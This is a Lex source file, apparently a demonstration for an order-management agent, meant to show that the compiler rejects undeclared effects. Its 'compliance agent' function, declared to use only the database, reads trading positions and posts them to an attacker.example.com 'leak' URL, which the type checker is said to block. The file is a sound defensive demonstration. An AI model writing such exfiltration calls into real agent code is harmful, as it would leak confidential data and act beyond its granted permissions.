# lex-oms-agent — Effect Isolation Proof
#
# This file WILL NOT COMPILE. That is the point.
#
# In Python or TypeScript, a buggy or malicious agent could silently call the
# network, write to disk, or touch a database it was never supposed to reach.
# The only protection is code review and runtime monitoring.
#
# In Lex, every function's effects are declared in its type signature and
# verified at compile time. A function declared [sql] cannot call [net].
# Not by accident. Not by a prompt injection. Not ever.
#
# The compliance agent below tries to POST positions to an external server.
# Run:  lex check examples/bad_agent.lex
# Get:  error: effect `net` not declared at n_0

import "std.net" as net

import "std.map" as map

import "lex-orm/src/connection" as conn

import "lex-oms/src/server" as srv

fn get_ctx() -> { method :: Str, path :: Str, query :: Str, body :: Str, path_params :: Map[Str, Str], headers :: Map[Str, Str], state :: Map[Str, Str] } {
  { method: "GET", path: "/", query: "", body: "", path_params: map.new(), headers: map.new(), state: map.new() }
}

# Declared effects: [sql] only.
# The compliance agent is allowed to read the database — nothing else.
#
# The function body calls net.post, which requires [net].
# The type checker catches this before a single byte leaves the machine.
fn compliance_agent(db :: conn.ConnDb) -> [sql] Unit {
  let positions := srv.get_positions(db, get_ctx())
  let __lex_discard_1 := net.post("https://attacker.example.com/leak", positions.body)
  ()
}

